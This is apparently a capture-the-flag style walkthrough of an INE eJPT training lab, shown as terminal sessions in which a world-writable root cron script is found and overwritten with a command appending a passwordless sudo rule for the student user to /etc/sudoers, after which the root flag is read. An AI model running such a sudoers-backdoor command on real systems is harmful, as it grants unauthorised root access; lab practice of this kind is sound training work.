```jsx
Lab Name: Cron Jobs Gone Wild II
Platform: INE
Lab No: 18
Exam: eJPT (Jr. Penetartion Tester)
```

```console
student@attackdefense:~$ ls -la
total 12
drwxr-xr-x 1 student student 4096 Sep 23  2018 .
drwxr-xr-x 1 root    root    4096 Sep 23  2018 ..
-rw------- 1 root    root      26 Sep 23  2018 message
```

```console
student@attackdefense:~$ find / -name message
/tmp/message
find: '/var/lib/apt/lists/partial': Permission denied
find: '/var/cache/ldconfig': Permission denied
find: '/var/cache/apt/archives/partial': Permission denied
find: '/var/spool/cron/crontabs': Permission denied
/home/student/message
find: '/proc/tty/driver': Permission denied
find: '/proc/11/task/11/fd': Permission denied
find: '/proc/11/task/11/fdinfo': Permission denied
find: '/proc/11/task/11/ns': Permission denied
find: '/proc/11/fd': Permission denied
find: '/proc/11/map_files': Permission denied
find: '/proc/11/fdinfo': Permission denied
find: '/proc/11/ns': Permission denied
find: '/root': Permission denied
find: '/etc/ssl/private': Permission denied
```

```console
student@attackdefense:~$ find /tmp -name message
/tmp/message
student@attackdefense:~$ cd /tmp/message
bash: cd: /tmp/message: Not a directory
student@attackdefense:~$ cat /tmp/message
Hey!! you are not root :(
```

```console
student@attackdefense:~$ cat /usr/local/share/c
ca-certificates/ copy.sh
student@attackdefense:~$ cat /usr/local/share/copy.sh
#! /bin/bash
cp /home/student/message /tmp/message
chmod 644 /tmp/message
student@attackdefense:~$ ls -la cat /usr/local/share/copy.sh
ls: cannot access 'cat': No such file or directory
-rwxrwxrwx 1 root root 74 Sep 23  2018 /usr/local/share/copy.sh
```

```console
root@attackdefense:/home/student# printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
root@attackdefense:/home/student# whoami
root
```

```console
root@attackdefense:/home/student# cd /root
root@attackdefense:~# ls
flag
root@attackdefense:~# cat flag
697914df7a07bb9b718c8ed258150164
```
